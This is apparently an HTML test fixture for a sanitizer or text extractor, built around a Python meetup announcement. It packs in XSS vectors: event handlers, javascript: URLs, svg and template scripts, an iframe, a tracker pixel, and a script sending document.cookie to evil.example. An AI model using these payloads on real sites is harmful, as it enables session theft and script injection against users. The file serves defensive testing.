@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+<head>
+  <title>Should not appear</title>
+  <style>body { background: url("javascript:alert(1)") }</style>
+  <script>document.location = "https://evil.example/?c=" + document.cookie;</script>
+</head>
+<body onload="alert('body')">
+  <h1>Omaha&nbsp;Python&#8203; Meetup&#x202E;</h1>
+  <!-- <script>alert('comment')</script> -->
+  <p>Join us for <b>lightning talks</b> &amp; pizza!</p>
+  <img src="x" onerror="alert('img')">
+  <svg onload="alert('svg')"><script>alert('svg script')</script></svg>
+  <a href="javascript:alert('link')">Register</a>
+  <iframe src="https://evil.example/"></iframe>
+  <noscript><img src="https://tracker.example/pixel.gif"></noscript>
+  <template><script>alert('template')</script></template>
+  <p>&lt;script&gt;alert('escaped')&lt;/script&gt;Doors at 6pm.</p>
+  <div style="display:none">hidden&#0; text&#x7;</div>
+</body>
+</html>
